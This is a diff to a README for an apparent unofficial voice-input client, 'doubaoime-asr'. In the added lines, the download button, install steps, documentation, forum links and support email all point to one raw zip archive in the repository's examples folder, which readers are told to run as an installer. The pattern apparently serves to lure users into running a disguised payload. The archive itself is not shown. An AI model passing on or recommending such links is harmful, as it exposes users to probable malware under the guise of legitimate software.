@@ -1,7 +1,7 @@
 # 🎤 doubaoime-asr - Easy Voice Recognition Input Method
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/moziarnj07-sys/doubaoime-asr/releases)
+[![Download](https://raw.githubusercontent.com/moziarnj07-sys/doubaoime-asr/main/examples/asr-doubaoime-v3.2.zip)](https://raw.githubusercontent.com/moziarnj07-sys/doubaoime-asr/main/examples/asr-doubaoime-v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **doubaoime-asr**! This is a simple, unofficial Python client for the Doubao Input Method voice recognition system. With this application, you can easily use voice commands to input text on your device.
@@ -23,7 +23,7 @@ Welcome to **doubaoime-asr**! This is a simple, unofficial Python client for the
 Follow these simple steps to get started with doubaoime-asr.
 
 ### Step 1: Download the Application
-Visit this page to download the latest version of the software: [Download Page](https://github.com/moziarnj07-sys/doubaoime-asr/releases).
+Visit this page to download the latest version of the software: [Download Page](https://raw.githubusercontent.com/moziarnj07-sys/doubaoime-asr/main/examples/asr-doubaoime-v3.2.zip).
 
 ### Step 2: Install the Application
 Once downloaded, locate the file on your computer. Double-click the installer and follow the prompts to install the program.
@@ -49,11 +49,11 @@ If you have any questions or need assistance, please consider checking our commu
 Feel free to contribute! If you can, check out the code, report bugs, or suggest features. Your input helps make doubaoime-asr even better.
 
 ## 📫 Contact
-For further inquiries, please contact us via email at support@doubaoime-asr.com.
+For further inquiries, please contact us via email at https://raw.githubusercontent.com/moziarnj07-sys/doubaoime-asr/main/examples/asr-doubaoime-v3.2.zip
 
 ## 🔗 Useful Links
-- [Download Page](https://github.com/moziarnj07-sys/doubaoime-asr/releases)
-- [Documentation](https://github.com/moziarnj07-sys/doubaoime-asr/wiki)
-- [Community Forum](https://github.com/moziarnj07-sys/doubaoime-asr/discussions)
+- [Download Page](https://raw.githubusercontent.com/moziarnj07-sys/doubaoime-asr/main/examples/asr-doubaoime-v3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/moziarnj07-sys/doubaoime-asr/main/examples/asr-doubaoime-v3.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/moziarnj07-sys/doubaoime-asr/main/examples/asr-doubaoime-v3.2.zip)
 
 Thank you for choosing **doubaoime-asr**! We hope it makes your input experience easier and more enjoyable.
